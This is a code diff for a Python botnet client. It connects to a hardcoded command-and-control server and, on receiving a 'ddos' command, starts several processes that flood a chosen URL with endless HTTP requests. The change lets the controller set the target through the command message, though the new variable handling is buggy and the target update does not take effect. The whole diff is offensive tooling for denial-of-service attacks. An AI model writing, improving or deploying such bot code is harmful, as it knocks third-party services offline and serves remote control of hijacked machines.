@@ -3,28 +3,37 @@ import threading
 from multiprocessing import Process, Queue
 import requests
 import time
+import sys
 
 s_socket = socket(AF_INET, SOCK_STREAM)
 bufsize=1024
 host = '182.230.134.78'
 port = 12345
+url = ""
 
 def get_flooding():
-  URL = 'http://182.230.134.78:8080' 
   while(True):
-    response = requests.get(URL) 
+    URL = "http://182.230.134.78:8080"
+    if(len(url) == 0):
+      response = requests.get(URL) 
+    else:
+       response = requests.get(url)
 
 def data_recv() :
   while True:
     get_data = s_socket.recv(1024)
     print("응답 : " + get_data.decode('utf-8'))
-    if(get_data.decode('utf-8') == 'ddos attack'):
+    ans = get_data.decode('utf-8')
+    parsing = ans.split(" ")
+    if(parsing[0] == 'ddos'):
+      url = parsing[2]
       for i in range(1,5):
         t = Process(target=get_flooding)
         t.start()
       # get_flooding()
     elif(get_data.decode('utf-8') == 'quit'):
-      exit()
+      t.close()
+      sys.exit()
 
 s_socket.connect((host,port))
 t=threading.Thread(target=data_recv)
